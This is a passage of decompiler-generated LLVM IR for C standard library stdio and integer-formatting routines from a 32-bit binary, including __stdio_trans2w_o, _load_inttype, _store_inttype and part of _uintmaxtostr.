  %v5_8054636 = add i32 %v4_8054636, %v3_8054636
  store i32 %v5_8054636, i32* %v2_8054636, align 4
  %v0_805463c = load i32, i32* @ebx, align 4
  %v1_805463c = add i32 %v0_805463c, 1
  %v2_805463c = inttoptr i32 %v1_805463c to i8*
  %v3_805463c = load i8, i8* %v2_805463c, align 1
  %v4_805463c = urem i8 %v3_805463c, 2
  %v5_805463c = icmp eq i8 %v4_805463c, 0
  br i1 %v5_805463c, label %dec_label_pc_80546c6, label %dec_label_pc_8054646

dec_label_pc_8054646:                             ; preds = %dec_label_pc_805462d
  %v0_8054646 = load i32, i32* @edx, align 4
  %v0_8054647 = load i32, i32* @edi, align 4
  %v4_805464b = call i32 @memrchr(i8 10, i32 %v0_8054647, i32 %v0_8054646)
  store i32 %v4_805464b, i32* %eax.global-to-local, align 4
  %v1_8054653 = icmp eq i32 %v4_805464b, 0
  br i1 %v1_8054653, label %dec_label_pc_80546c6, label %dec_label_pc_8054657

dec_label_pc_8054657:                             ; preds = %dec_label_pc_8054646
  %v0_805465a = load i32, i32* @ebx, align 4
  %v1_805465b = call i32 @__stdio_wcommit(i32 %v0_805465a)
  store i32 %v1_805465b, i32* %eax.global-to-local, align 4
  %v1_8054663 = icmp eq i32 %v1_805465b, 0
  br i1 %v1_8054663, label %dec_label_pc_80546c6, label %dec_label_pc_8054667

dec_label_pc_8054667:                             ; preds = %dec_label_pc_8054657
  %v0_8054667 = load i32, i32* @edi, align 4
  %tmp23 = icmp ugt i32 %v0_8054667, %v1_805465b
  br i1 %tmp23, label %dec_label_pc_805466d, label %dec_label_pc_805466f

dec_label_pc_805466d:                             ; preds = %dec_label_pc_8054667
  br label %dec_label_pc_805466f

dec_label_pc_805466f:                             ; preds = %dec_label_pc_8054667, %dec_label_pc_805466d
  %storemerge22 = phi i32 [ %v1_805465b, %dec_label_pc_805466d ], [ %v0_8054667, %dec_label_pc_8054667 ]
  %v0_8054676 = phi i32 [ %v1_805465b, %dec_label_pc_805466d ], [ %v0_8054667, %dec_label_pc_8054667 ]
  store i32 %storemerge22, i32* %esi.global-to-local, align 4
  %v2_8054671 = sub i32 %v0_8054667, %v0_8054676
  store i32 %v2_8054671, i32* %eax.global-to-local, align 4
  %v0_8054673 = load i32, i32* @ebp, align 4
  %v2_8054673 = add i32 %v0_8054673, %v2_8054671
  store i32 %v2_8054673, i32* %ebp.global-to-local, align 4
  %v4_805467a = call i32 @__GI_memchr(i8* inttoptr (i32 10 to i8*), i32 %v0_8054676, i32 %v2_8054671)
  store i32 %v4_805467a, i32* %eax.global-to-local, align 4
  store i32 %v4_805467a, i32* @edx, align 4
  %v1_8054684 = icmp eq i32 %v4_805467a, 0
  br i1 %v1_8054684, label %dec_label_pc_80546c6, label %dec_label_pc_8054688

dec_label_pc_8054688:                             ; preds = %dec_label_pc_805466f
  %v0_8054688 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8054688 = load i32, i32* %esi.global-to-local, align 4
  %v2_8054688 = sub i32 %v0_8054688, %v4_805467a
  %v2_805468c = add i32 %v2_8054688, %v1_8054688
  store i32 %v2_805468c, i32* %eax.global-to-local, align 4
  %v0_805468e = load i32, i32* @ebx, align 4
  %v1_805468e = add i32 %v0_805468e, 16
  %v2_805468e = inttoptr i32 %v1_805468e to i32*
  %v3_805468e = load i32, i32* %v2_805468e, align 4
  %v5_805468e = sub i32 %v3_805468e, %v2_805468c
  store i32 %v5_805468e, i32* %v2_805468e, align 4
  %v0_8054691 = load i32, i32* @edi, align 4
  %v1_8054691 = load i32, i32* %eax.global-to-local, align 4
  %v2_8054691 = sub i32 %v0_8054691, %v1_8054691
  store i32 %v2_8054691, i32* @edi, align 4
  br label %dec_label_pc_80546c6

dec_label_pc_8054695:                             ; preds = %dec_label_pc_8054627
  %v2_8054695 = add i32 %arg3, 8
  %v3_8054695 = inttoptr i32 %v2_8054695 to i32*
  %v4_8054695 = load i32, i32* %v3_8054695, align 4
  %v15_8054695 = icmp eq i32 %v3_8054601, %v4_8054695
  br i1 %v15_8054695, label %dec_label_pc_80546ae, label %dec_label_pc_805469a

dec_label_pc_805469a:                             ; preds = %dec_label_pc_8054695
  %v1_805469e = call i32 @__stdio_wcommit(i32 %arg3)
  store i32 %v1_805469e, i32* %eax.global-to-local, align 4
  %v1_80546a6 = icmp eq i32 %v1_805469e, 0
  br i1 %v1_80546a6, label %dec_label_pc_805469a.dec_label_pc_80546ae_crit_edge, label %dec_label_pc_80546aa

dec_label_pc_805469a.dec_label_pc_80546ae_crit_edge: ; preds = %dec_label_pc_805469a
  %v0_80546ae.pre = load i32, i32* @edi, align 4
  %v0_80546b6.pre = load i32, i32* @ebx, align 4
  %v2_80546bd.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_80546ae

dec_label_pc_80546aa:                             ; preds = %dec_label_pc_805469a
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_80546c6

dec_label_pc_80546ae:                             ; preds = %dec_label_pc_805469a.dec_label_pc_80546ae_crit_edge, %dec_label_pc_8054695, %entry
  %v2_80546bd = phi i32 [ %v2_80546bd.pre, %dec_label_pc_805469a.dec_label_pc_80546ae_crit_edge ], [ %v0_80545e3, %dec_label_pc_8054695 ], [ %v0_80545e3, %entry ]
  %v0_80546b6 = phi i32 [ %v0_80546b6.pre, %dec_label_pc_805469a.dec_label_pc_80546ae_crit_edge ], [ %arg3, %dec_label_pc_8054695 ], [ %arg3, %entry ]
  %v0_80546ae = phi i32 [ %v0_80546ae.pre, %dec_label_pc_805469a.dec_label_pc_80546ae_crit_edge ], [ %arg2, %dec_label_pc_8054695 ], [ %arg2, %entry ]
  store i32 %v2_80546bd, i32* @ebx, align 4
  store i32 %v0_80545e2, i32* @esi, align 4
  store i32 %v0_80545e1, i32* @edi, align 4
  store i32 %v0_80545e0, i32* @ebp, align 4
  %v4_80546c1 = inttoptr i32 %v0_80546b6 to i16*
  %v5_80546c1 = call i32 @__stdio_WRITE(i16* %v4_80546c1, i32 %v0_80546ae, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_80546c1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80546c6

dec_label_pc_80546c6:                             ; preds = %dec_label_pc_805466f, %dec_label_pc_8054657, %dec_label_pc_8054646, %dec_label_pc_805462d, %dec_label_pc_80546aa, %dec_label_pc_8054688, %dec_label_pc_8054613, %dec_label_pc_80546ae
  %v0_80546c9 = load i32, i32* @edi, align 4
  store i32 %v0_80546c9, i32* %eax.global-to-local, align 4
  %v2_80546cb = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80546cb, i32* @ebx, align 4
  store i32 %v0_80545e2, i32* @esi, align 4
  store i32 %v0_80545e1, i32* @edi, align 4
  store i32 %v0_80545e0, i32* @ebp, align 4
  ret i32 %v0_80546c9

; uselistorder directives
  uselistorder i32 %v2_805468c, { 1, 0 }
  uselistorder i32 %v4_805467a, { 0, 2, 1, 3 }
  uselistorder i32 %v2_8054671, { 1, 0, 2 }
  uselistorder i32 %v0_8054667, { 3, 0, 1, 2 }
  uselistorder i32 %v2_8054627, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 %v0_80545e2, { 1, 0 }
  uselistorder i32 %v0_80545e1, { 1, 0 }
  uselistorder i32 %v0_80545e0, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %esi.global-to-local, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32 %arg3, { 0, 1, 2, 3, 5, 4, 6, 8, 7 }
  uselistorder i32 %arg2, { 4, 5, 6, 3, 0, 1, 2, 7 }
  uselistorder label %dec_label_pc_80546c6, { 7, 4, 5, 0, 1, 2, 3, 6 }
  uselistorder label %dec_label_pc_805466f, { 1, 0 }
  uselistorder label %dec_label_pc_8054613, { 1, 0 }
}

define i32 @__stdio_trans2w_o(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_80546d0 = load i32, i32* @ebx, align 4
  %v4_80546d4 = ptrtoint i16* %arg1 to i32
  store i32 %v4_80546d4, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v1_80546dc = bitcast i16* %arg1 to i32*
  %v2_80546dc = load i32, i32* %v1_80546dc, align 4
  store i32 %v2_80546dc, i32* %eax.global-to-local, align 4
  %v1_80546de = urem i32 %v2_80546dc, 65536
  store i32 %v1_80546de, i32* %edx.global-to-local, align 4
  %v2_80546e1 = and i32 %v1_80546de, %arg2
  %v3_80546e1 = icmp eq i32 %v2_80546e1, 0
  %v1_80546e3 = icmp eq i1 %v3_80546e1, false
  br i1 %v1_80546e3, label %dec_label_pc_80546f2, label %dec_label_pc_80546e5

dec_label_pc_80546e5:                             ; preds = %entry
  %v1_80546e5 = and i32 %v2_80546dc, 2176
  %v2_80546e5 = icmp eq i32 %v1_80546e5, 0
  store i32 %v1_80546e5, i32* %edx.global-to-local, align 4
  %v1_80546eb = icmp eq i1 %v2_80546e5, false
  br i1 %v1_80546eb, label %dec_label_pc_80546fa, label %dec_label_pc_80546ed

dec_label_pc_80546ed:                             ; preds = %dec_label_pc_80546e5
  %v2_80546ed = or i32 %v2_80546dc, %arg2
  store i32 %v2_80546ed, i32* %eax.global-to-local, align 4
  %v1_80546ef = trunc i32 %v2_80546ed to i16
  store i16 %v1_80546ef, i16* %arg1, align 2
  %v0_80546f2.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80546f2

dec_label_pc_80546f2:                             ; preds = %entry, %dec_label_pc_80546ed
  %v0_8054737 = phi i32 [ %v4_80546d4, %entry ], [ %v0_80546f2.pre, %dec_label_pc_80546ed ]
  %v1_80546f2 = inttoptr i32 %v0_8054737 to i16*
  %v2_80546f2 = load i16, i16* %v1_80546f2, align 2
  %v3_80546f2 = zext i16 %v2_80546f2 to i32
  store i32 %v3_80546f2, i32* %edx.global-to-local, align 4
  %v2_80546f5 = and i16 %v2_80546f2, 32
  %v3_80546f5 = icmp eq i16 %v2_80546f5, 0
  br i1 %v3_80546f5, label %dec_label_pc_805470e, label %dec_label_pc_80546fa

dec_label_pc_80546fa:                             ; preds = %dec_label_pc_80546f2, %dec_label_pc_80546e5
  %v1_80546fa = call i32 @__errno_location(i32 %v0_80546d0)
  store i32 %v1_80546fa, i32* %eax.global-to-local, align 4
  %v1_80546ff = inttoptr i32 %v1_80546fa to i32*
  store i32 9, i32* %v1_80546ff, align 4
  br label %dec_label_pc_8054705

dec_label_pc_8054705:                             ; preds = %dec_label_pc_8054725, %dec_label_pc_80546fa
  %v0_8054705 = load i32, i32* @ebx, align 4
  %v1_8054705 = inttoptr i32 %v0_8054705 to i16*
  %v2_8054705 = load i16, i16* %v1_8054705, align 2
  %v3_8054705 = or i16 %v2_8054705, 8
  store i16 %v3_8054705, i16* %v1_8054705, align 2
  store i32 -1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8054768

dec_label_pc_805470e:                             ; preds = %dec_label_pc_80546f2
  %v2_805470e = urem i16 %v2_80546f2, 4
  %v3_805470e = icmp eq i16 %v2_805470e, 0
  br i1 %v3_805470e, label %dec_label_pc_8054754, label %dec_label_pc_8054713

dec_label_pc_8054713:                             ; preds = %dec_label_pc_805470e
  %v2_8054713 = and i32 %v3_80546f2, 4
  %v3_8054713 = icmp eq i32 %v2_8054713, 0
  %v1_8054716 = icmp eq i1 %v3_8054713, false
  br i1 %v1_8054716, label %dec_label_pc_8054744, label %dec_label_pc_8054718

dec_label_pc_8054718:                             ; preds = %dec_label_pc_8054713
  %v1_8054718 = add i32 %v0_8054737, 20
  %v2_8054718 = inttoptr i32 %v1_8054718 to i32*
  %v3_8054718 = load i32, i32* %v2_8054718, align 4
  store i32 %v3_8054718, i32* %eax.global-to-local, align 4
  %v2_805471b = add i32 %v0_8054737, 16
  %v3_805471b = inttoptr i32 %v2_805471b to i32*
  %v4_805471b = load i32, i32* %v3_805471b, align 4
  %v15_805471b = icmp eq i32 %v3_8054718, %v4_805471b
  %v1_805471e = icmp eq i1 %v15_805471b, false
  br i1 %v1_805471e, label %dec_label_pc_8054725, label %dec_label_pc_8054720

dec_label_pc_8054720:                             ; preds = %dec_label_pc_8054718
  %v2_8054720 = and i32 %v3_80546f2, 2
  %v3_8054720 = icmp eq i32 %v2_8054720, 0
  br i1 %v3_8054720, label %dec_label_pc_8054744, label %dec_label_pc_8054725

dec_label_pc_8054725:                             ; preds = %dec_label_pc_8054720, %dec_label_pc_8054718
  %v1_8054725 = and i32 %v3_80546f2, 1024
  store i32 %v1_8054725, i32* %edx.global-to-local, align 4
  %tmp17 = udiv i32 %v1_8054725, 1024
  %tmp18 = xor i32 %tmp17, 3
  store i32 %tmp18, i32* %eax.global-to-local, align 4
  %v5_8054738 = call i32 @__GI_fseek(i32 %v0_8054737, i32 0, i32 %tmp18, i32 %v1_8054725)
  store i32 %v5_8054738, i32* %eax.global-to-local, align 4
  %v1_8054740 = icmp eq i32 %v5_8054738, 0
  %v1_8054742 = icmp eq i1 %v1_8054740, false
  br i1 %v1_8054742, label %dec_label_pc_8054705, label %dec_label_pc_8054725.dec_label_pc_8054744_crit_edge

dec_label_pc_8054725.dec_label_pc_8054744_crit_edge: ; preds = %dec_label_pc_8054725
  %v0_8054744.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8054744

dec_label_pc_8054744:                             ; preds = %dec_label_pc_8054725.dec_label_pc_8054744_crit_edge, %dec_label_pc_8054720, %dec_label_pc_8054713
  %v10_8054744 = phi i32 [ %v0_8054744.pre, %dec_label_pc_8054725.dec_label_pc_8054744_crit_edge ], [ %v0_8054737, %dec_label_pc_8054720 ], [ %v0_8054737, %dec_label_pc_8054713 ]
  %v1_8054744 = inttoptr i32 %v10_8054744 to i16*
  %v2_8054744 = load i16, i16* %v1_8054744, align 2
  %v3_8054744 = and i16 %v2_8054744, -4
  store i16 %v3_8054744, i16* %v1_8054744, align 2
  %v0_8054748 = load i32, i32* @ebx, align 4
  %v1_8054748 = add i32 %v0_8054748, 8
  %v2_8054748 = inttoptr i32 %v1_8054748 to i32*
  %v3_8054748 = load i32, i32* %v2_8054748, align 4
  store i32 %v3_8054748, i32* %eax.global-to-local, align 4
  %v2_805474b = add i32 %v0_8054748, 24
  %v3_805474b = inttoptr i32 %v2_805474b to i32*
  store i32 %v3_8054748, i32* %v3_805474b, align 4
  %v0_805474e = load i32, i32* %eax.global-to-local, align 4
  %v1_805474e = load i32, i32* @ebx, align 4
  %v2_805474e = add i32 %v1_805474e, 16
  %v3_805474e = inttoptr i32 %v2_805474e to i32*
  store i32 %v0_805474e, i32* %v3_805474e, align 4
  %v0_8054751 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054751 = load i32, i32* @ebx, align 4
  %v2_8054751 = add i32 %v1_8054751, 20
  %v3_8054751 = inttoptr i32 %v2_8054751 to i32*
  store i32 %v0_8054751, i32* %v3_8054751, align 4
  %v0_8054754.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8054754

dec_label_pc_8054754:                             ; preds = %dec_label_pc_805470e, %dec_label_pc_8054744
  %v9_8054754 = phi i32 [ %v0_8054737, %dec_label_pc_805470e ], [ %v0_8054754.pre, %dec_label_pc_8054744 ]
  %v1_8054754 = inttoptr i32 %v9_8054754 to i16*
  %v2_8054754 = load i16, i16* %v1_8054754, align 2
  %v3_8054754 = or i16 %v2_8054754, 64
  store i16 %v3_8054754, i16* %v1_8054754, align 2
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_805475a = load i32, i32* @ebx, align 4
  %v1_805475a = inttoptr i32 %v0_805475a to i16*
  %v2_805475a = load i16, i16* %v1_805475a, align 2
  %v3_805475a = zext i16 %v2_805475a to i32
  store i32 %v3_805475a, i32* %eax.global-to-local, align 4
  %v3_805475d = and i16 %v2_805475a, 2816
  %v4_805475d = icmp eq i16 %v3_805475d, 0
  %v1_8054760 = icmp eq i1 %v4_805475d, false
  br i1 %v1_8054760, label %dec_label_pc_8054768, label %dec_label_pc_8054762

dec_label_pc_8054762:                             ; preds = %dec_label_pc_8054754
  %v1_8054762 = add i32 %v0_805475a, 12
  %v2_8054762 = inttoptr i32 %v1_8054762 to i32*
  %v3_8054762 = load i32, i32* %v2_8054762, align 4
  store i32 %v3_8054762, i32* %eax.global-to-local, align 4
  %v2_8054765 = add i32 %v0_805475a, 28
  %v3_8054765 = inttoptr i32 %v2_8054765 to i32*
  store i32 %v3_8054762, i32* %v3_8054765, align 4
  %v0_8054768.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8054768

dec_label_pc_8054768:                             ; preds = %dec_label_pc_8054754, %dec_label_pc_8054705, %dec_label_pc_8054762
  %v0_8054768 = phi i32 [ 0, %dec_label_pc_8054754 ], [ -1, %dec_label_pc_8054705 ], [ %v0_8054768.pre, %dec_label_pc_8054762 ]
  store i32 %v0_8054768, i32* %eax.global-to-local, align 4
  %v2_805476a = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805476a, i32* @edx, align 4
  store i32 %v0_80546d0, i32* @ebx, align 4
  ret i32 %v0_8054768

; uselistorder directives
  uselistorder i32 %v0_8054768, { 1, 0 }
  uselistorder i32 %v0_805475a, { 1, 0, 2 }
  uselistorder i32 %tmp18, { 1, 0 }
  uselistorder i32 %v1_8054725, { 1, 0, 2 }
  uselistorder i32 %v0_8054737, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v1_80546de, { 1, 0 }
  uselistorder i32 %v2_80546dc, { 1, 2, 0, 3 }
  uselistorder i32 %v0_80546d0, { 1, 0 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8054768, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054754, { 1, 0 }
  uselistorder label %dec_label_pc_80546f2, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %v5_8054778 = icmp slt i32 %tmp, 0
  %v3_80547a1 = and i32 %tmp5, 2048
  %v4_80547a1 = icmp eq i32 %v3_80547a1, 0
  br i1 %v5_8054778, label %dec_label_pc_80547a1, label %dec_label_pc_805477f

dec_label_pc_805477f:                             ; preds = %entry
  %v1_8054782 = icmp eq i1 %v4_80547a1, false
  br i1 %v1_8054782, label %dec_label_pc_80547a6, label %dec_label_pc_8054784

dec_label_pc_8054784:                             ; preds = %dec_label_pc_805477f
  %v1_8054784 = inttoptr i32 %tmp4 to i32*
  %v2_8054784 = load i32, i32* %v1_8054784, align 4
  %v6_8054786 = icmp eq i32 %tmp5, 256
  %v1_805478c = icmp eq i1 %v6_8054786, false
  br i1 %v1_805478c, label %dec_label_pc_8054793, label %dec_label_pc_805478e

dec_label_pc_805478e:                             ; preds = %dec_label_pc_8054784
  %v1_805478e = urem i32 %v2_8054784, 256
  br label %dec_label_pc_805479e

dec_label_pc_8054793:                             ; preds = %dec_label_pc_8054784
  %v6_8054793 = icmp eq i32 %tmp5, 512
  %v1_8054799 = icmp eq i1 %v6_8054793, false
  br i1 %v1_8054799, label %dec_label_pc_805479e, label %dec_label_pc_805479b

dec_label_pc_805479b:                             ; preds = %dec_label_pc_8054793
  %v1_805479b = urem i32 %v2_8054784, 65536
  br label %dec_label_pc_805479e

dec_label_pc_805479e:                             ; preds = %dec_label_pc_8054793, %dec_label_pc_805478e, %dec_label_pc_805479b
  %v0_80547a0 = phi i32 [ %v2_8054784, %dec_label_pc_8054793 ], [ %v1_805478e, %dec_label_pc_805478e ], [ %v1_805479b, %dec_label_pc_805479b ]
  store i32 0, i32* @edx, align 4
  ret i32 %v0_80547a0

dec_label_pc_80547a1:                             ; preds = %entry
  br i1 %v4_80547a1, label %dec_label_pc_80547ac, label %dec_label_pc_80547a6

dec_label_pc_80547a6:                             ; preds = %dec_label_pc_80547a1, %dec_label_pc_805477f
  %v1_80547a6 = add i32 %tmp4, 4
  %v2_80547a6 = inttoptr i32 %v1_80547a6 to i32*
  %v3_80547a6 = load i32, i32* %v2_80547a6, align 4
  store i32 %v3_80547a6, i32* @edx, align 4
  %v1_80547a9 = inttoptr i32 %tmp4 to i32*
  %v2_80547a9 = load i32, i32* %v1_80547a9, align 4
  ret i32 %v2_80547a9

dec_label_pc_80547ac:                             ; preds = %dec_label_pc_80547a1
  %v1_80547ac = inttoptr i32 %tmp4 to i32*
  %v2_80547ac = load i32, i32* %v1_80547ac, align 4
  %v6_80547ae = icmp eq i32 %tmp5, 256
  %v1_80547b4 = icmp eq i1 %v6_80547ae, false
  br i1 %v1_80547b4, label %dec_label_pc_80547bb, label %dec_label_pc_80547b6

dec_label_pc_80547b6:                             ; preds = %dec_label_pc_80547ac
  %v1_80547b6 = mul i32 %v2_80547ac, 16777216
  %v2_80547b6 = sdiv i32 %v1_80547b6, 16777216
  br label %dec_label_pc_80547c4

dec_label_pc_80547bb:                             ; preds = %dec_label_pc_80547ac
  %v6_80547bb = icmp eq i32 %tmp5, 512
  %v1_80547c1 = icmp eq i1 %v6_80547bb, false
  br i1 %v1_80547c1, label %dec_label_pc_80547c4, label %dec_label_pc_80547c3

dec_label_pc_80547c3:                             ; preds = %dec_label_pc_80547bb
  %v1_80547c3 = mul i32 %v2_80547ac, 65536
  %v2_80547c3 = sdiv i32 %v1_80547c3, 65536
  br label %dec_label_pc_80547c4

dec_label_pc_80547c4:                             ; preds = %dec_label_pc_80547bb, %dec_label_pc_80547b6, %dec_label_pc_80547c3
  %v0_80547c4 = phi i32 [ %v2_80547ac, %dec_label_pc_80547bb ], [ %v2_80547b6, %dec_label_pc_80547b6 ], [ %v2_80547c3, %dec_label_pc_80547c3 ]
  %v1_80547c4 = ashr i32 %v0_80547c4, 31
  store i32 %v1_80547c4, i32* @edx, align 4
  ret i32 %v0_80547c4

; uselistorder directives
  uselistorder i32 %v0_80547c4, { 1, 0 }
  uselistorder i32 %v2_80547ac, { 2, 0, 1 }
  uselistorder i32 %v2_8054784, { 2, 0, 1 }
  uselistorder i32 %tmp4, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_80547c4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805479e, { 2, 0, 1 }
}

define i32 @_store_inttype() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i16* @__decompiler_undefined_function_4()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_80547c8 = load i32, i32* @ebx, align 4
  store i32 %v0_80547c8, i32* %stack_var_-4, align 4
  store i32 %tmp6, i32* @ecx, align 4
  %v4_80547cd = ptrtoint i16* %tmp5 to i32
  store i32 %v4_80547cd, i32* %ebx.global-to-local, align 4
  %v4_80547d1 = trunc i32 %tmp4 to i16
  %v6_80547d9 = icmp eq i32 %tmp6, 256
  %v1_80547df = icmp eq i1 %v6_80547d9, false
  br i1 %v1_80547df, label %dec_label_pc_80547e5, label %dec_label_pc_80547e1

dec_label_pc_80547e1:                             ; preds = %entry
  %v2_80547e1 = trunc i32 %tmp4 to i8
  %v4_80547e1 = bitcast i16* %tmp5 to i8*
  store i8 %v2_80547e1, i8* %v4_80547e1, align 1
  br label %dec_label_pc_8054803

dec_label_pc_80547e5:                             ; preds = %entry
  %v6_80547e5 = icmp eq i32 %tmp6, 2048
  %v1_80547eb = icmp eq i1 %v6_80547e5, false
  br i1 %v1_80547eb, label %dec_label_pc_80547f4, label %dec_label_pc_80547ed

dec_label_pc_80547ed:                             ; preds = %dec_label_pc_80547e5
  %sext2 = mul i32 %tmp4, 65536
  %v1_80547ed = sdiv i32 %sext2, 65536
  %v3_80547ed = bitcast i16* %tmp5 to i32*
  store i32 %v1_80547ed, i32* %v3_80547ed, align 4
  %v0_80547ef = load i32, i32* %edx.global-to-local, align 4
  %v1_80547ef = load i32, i32* %ebx.global-to-local, align 4
  %v2_80547ef = add i32 %v1_80547ef, 4
  %v3_80547ef = inttoptr i32 %v2_80547ef to i32*
  store i32 %v0_80547ef, i32* %v3_80547ef, align 4
  br label %dec_label_pc_8054803

dec_label_pc_80547f4:                             ; preds = %dec_label_pc_80547e5
  %v6_80547f4 = icmp eq i32 %tmp6, 512
  %v1_80547fa = icmp eq i1 %v6_80547f4, false
  br i1 %v1_80547fa, label %dec_label_pc_8054801, label %dec_label_pc_80547fc

dec_label_pc_80547fc:                             ; preds = %dec_label_pc_80547f4
  store i16 %v4_80547d1, i16* %tmp5, align 2
  br label %dec_label_pc_8054803

dec_label_pc_8054801:                             ; preds = %dec_label_pc_80547f4
  %sext3 = mul i32 %tmp4, 65536
  %v1_8054801 = sdiv i32 %sext3, 65536
  %v3_8054801 = bitcast i16* %tmp5 to i32*
  store i32 %v1_8054801, i32* %v3_8054801, align 4
  br label %dec_label_pc_8054803

dec_label_pc_8054803:                             ; preds = %dec_label_pc_80547fc, %dec_label_pc_80547ed, %dec_label_pc_80547e1, %dec_label_pc_8054801
  %v2_8054803 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8054803, i32* %ebx.global-to-local, align 4
  %sext = mul i32 %tmp4, 65536
  %v1_8054804 = sdiv i32 %sext, 65536
  ret i32 %v1_8054804

; uselistorder directives
  uselistorder label %dec_label_pc_8054803, { 3, 0, 1, 2 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v4_8054813 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8054813, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* %ecx.global-to-local, align 4
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  %v2_805481f = icmp slt i32 %arg4, 0
  %v1_8054821 = icmp eq i1 %v2_805481f, false
  br i1 %v1_8054821, label %dec_label_pc_8054842, label %dec_label_pc_8054823

dec_label_pc_8054823:                             ; preds = %entry
  %v1_8054823 = sub i32 0, %arg4
  store i32 %v1_8054823, i32* %esi.global-to-local, align 4
  %v2_8054825 = icmp slt i32 %arg3, 0
  %v1_8054827 = icmp eq i1 %v2_8054825, false
  br i1 %v1_8054827, label %dec_label_pc_8054842, label %dec_label_pc_8054829

dec_label_pc_8054829:                             ; preds = %dec_label_pc_8054823
  %v1_8054829 = sub i32 0, %arg2
  %v5_8054829 = icmp ne i32 %arg2, 0
  store i32 %v1_8054829, i32* %ecx.global-to-local, align 4
  %v2_805482b = zext i1 %v5_8054829 to i32
  %v3_805482b = add i32 %v2_805482b, %arg3
  %v1_8054836 = sub i32 0, %v3_805482b
  store i32 %v1_8054836, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054842

dec_label_pc_8054842:                             ; preds = %entry, %dec_label_pc_8054823, %dec_label_pc_8054829
  %v0_8054847 = phi i32 [ %v1_8054823, %dec_label_pc_8054829 ], [ %v1_8054823, %dec_label_pc_8054823 ], [ %arg4, %entry ]
  %stack_var_-28.0 = phi i32 [ 1, %dec_label_pc_8054829 ], [ 0, %dec_label_pc_8054823 ], [ 0, %entry ]
  %div = udiv i32 -1, %v0_8054847
  %tmp35 = urem i32 -1, %v0_8054847
  %v1_8054849 = add i32 %tmp35, 1
  store i8 0, i8* %arg1, align 1
  %v1_805484d = load i32, i32* %esi.global-to-local, align 4
  %v12_805484d = icmp eq i32 %v1_8054849, %v1_805484d
  %v1_8054857 = icmp eq i1 %v12_805484d, false
  br i1 %v1_8054857, label %dec_label_pc_8054866, label %dec_label_pc_8054859

dec_label_pc_8054859:                             ; preds = %dec_label_pc_8054842
  %v1_8054859 = add i32 %div, 1
  br label %dec_label_pc_8054866

dec_label_pc_8054866:                             ; preds = %dec_label_pc_8054842, %dec_label_pc_8054859
  %stack_var_-20.0.off0 = phi i32 [ %v1_8054849, %dec_label_pc_8054842 ], [ 0, %dec_label_pc_8054859 ]
  %stack_var_-24.0.in = phi i32 [ %div, %dec_label_pc_8054842 ], [ %v1_8054859, %dec_label_pc_8054859 ]
  %v0_8054866 = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_8054866, i32* %ebp.global-to-local, align 4
  %v0_8054868 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8054868, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_805486e

dec_label_pc_805486e:                             ; preds = %dec_label_pc_80548ad, %dec_label_pc_8054866
  %v0_80548a5 = phi i32 [ %v0_80548be, %dec_label_pc_80548ad ], [ %v0_8054866, %dec_label_pc_8054866 ]
  %v0_8054872 = phi i32 [ %v1_80548c0, %dec_label_pc_80548ad ], [ %v0_8054868, %dec_label_pc_8054866 ]
  %v1_805486e = icmp eq i32 %v0_8054872, 0
  br i1 %v1_805486e, label %dec_label_pc_80548a5, label %dec_label_pc_8054872

dec_label_pc_8054872:                             ; preds = %dec_label_pc_805486e
  %v0_8054876 = load i32, i32* %esi.global-to-local, align 4
  %div7 = udiv i32 %v0_8054872, %v0_8054876
  %tmp36 = urem i32 %v0_8054872, %v0_8054876
  store i32 %div7, i32* %ebx.global-to-local, align 4
  %div8 = udiv i32 %v0_80548a5, %v0_8054876
